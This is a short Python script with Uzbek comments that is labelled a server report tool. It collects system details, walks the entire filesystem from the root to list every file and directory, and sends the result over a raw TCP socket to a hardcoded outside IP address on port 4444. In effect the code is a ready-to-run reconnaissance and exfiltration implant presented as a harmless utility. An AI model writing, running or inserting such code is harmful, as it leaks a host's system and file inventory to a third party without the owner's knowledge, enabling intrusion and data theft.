import os
import platform
import psutil
import socket

def get_server_info():
    # Server haqida ma'lumot
    server_info = {}
    server_info['platform'] = platform.platform()
    server_info['processor'] = platform.processor()
    server_info['ram'] = psutil.virtual_memory().total / (1024.0 ** 3)
    server_info['disk'] = psutil.disk_usage('/').total / (1024.0 ** 3)

    # Fayllar va papkalar haqida ma'lumot
    files_and_dirs = []
    for root, dirs, files in os.walk('/'):
        for file in files:
            files_and_dirs.append(os.path.join(root, file))
        for dir in dirs:
            files_and_dirs.append(os.path.join(root, dir))

    server_info['files_and_dirs'] = files_and_dirs

    return server_info

def create_report(server_info):
    report = "Server Report:\n"
    report += f"Platform: {server_info['platform']}\n"
    report += f"Processor: {server_info['processor']}\n"
    report += f"RAM: {server_info['ram']} GB\n"
    report += f"Disk: {server_info['disk']} GB\n"
    report += "Files and Directories:\n"
    for file_or_dir in server_info['files_and_dirs']:
        report += f"{file_or_dir}\n"
    return report

def send_report(report, ip_address, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((ip_address, port))
    sock.sendall(report.encode())
    sock.close()

if __name__ == '__main__':
    server_info = get_server_info()
    report = create_report(server_info)
    ip_address = "185.100.54.38"  # Replace with the IP address of the receiving server
    port = 4444  # Replace with the port number to use
    send_report(report, ip_address, port)